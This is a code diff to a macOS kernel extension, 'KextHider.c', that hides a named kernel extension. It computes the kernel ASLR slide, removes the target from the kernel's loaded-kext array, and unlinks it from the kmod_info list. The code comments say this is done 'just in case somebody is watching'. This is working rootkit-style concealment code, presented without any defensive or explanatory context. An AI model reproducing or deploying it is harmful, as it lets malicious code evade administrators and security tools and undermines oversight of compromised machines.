@@ -1,5 +1,6 @@
 //
 //  KextHider.c
+//   by @_rc0r
 //
 
 #include "KextHider.h"
@@ -10,8 +11,6 @@ kern_return_t KextHider_start(kmod_info_t * ki, void *d)
     DLOG( "[+] Supplied kmod_info_t size: %ld\n", ki->size );
     DLOG( "[+] Supplied kmod_info_t name: %s\n", ki->name );
     DLOG( "[+] Supplied kmod_info_t next: %016lX\n", ki->next->address );
-    //ki->next = ki->next->next;
-    //DLOG( "[+] Supplied kmod_info_t next (m): %016lX\n", ki->next->address );
     
     find_kernel_baseaddr();
     
@@ -19,8 +18,9 @@ kern_return_t KextHider_start(kmod_info_t * ki, void *d)
     
     DLOG( "[+] Kernel ASLR slide: 0x%016lX\n", slide );
     
+    /** clean up OSArray of OSKexts **/
     mach_vm_address_t *sLoadedKexts = ( mach_vm_address_t * ) ( SKEXTLOADED_ADDR + slide );
-    uint32_t *kext_count = NULL;    // +0x38
+    uint32_t *kext_count = NULL;
     
     kext_count = ( uint32_t * ) (*((mach_vm_address_t *)sLoadedKexts)+0x20);
     DLOG( "[+] Loaded kext count: %u\n", *kext_count );
@@ -52,12 +52,41 @@ kern_return_t KextHider_start(kmod_info_t * ki, void *d)
                 for( uint8_t j = i; j < (*kext_count); j++ )
                     ko[j]=ko[j+1];
             }
-            
-            // do cleanup on kmod list, just in case somebody is watching
-            // ...
         }
     }
+    
+    /** do cleanup of kmod list, just in case somebody is watching **/
+    
+    // points to head of queue which is some bogus? kmod_info
+    // next kmod_info belongs to last loaded kext
+    kmod_info_t *kmod = ( kmod_info_t * ) ( KMOD_ADDR + slide );
+    
+    //DLOG( "[+] Kmod first entry name: \"%s\"\n", kmod->next->name );
+    
+    kmod_info_t *kmod_info = kmod;
+    kmod_info_t *kmod_infop = kmod;
+    
+    // print list before cleanup
+    //while ( ( kmod_info = kmod_info->next ) != NULL )
+    //    DLOG( "[b] %s\n", kmod_info->name );
+    //kmod_info = kmod;
+    
+    while ( ( kmod_info = kmod_info->next ) != NULL )
+    {
+        if( strncmp( kmod_info->name, kextToHide, strlen( kmod_info->name ) ) == 0 )
+        {
+            kmod_infop->next = kmod_info->next;
+            continue;
+        }
+        
+        kmod_infop = kmod_infop->next;
+    }
 
+    //kmod_info = kmod;
+    // print list after cleanup
+    //while ( ( kmod_info = kmod_info->next ) != NULL )
+    //    DLOG( "[c] %s\n", kmod_info->name );
+    
     return KERN_SUCCESS;
 }
 
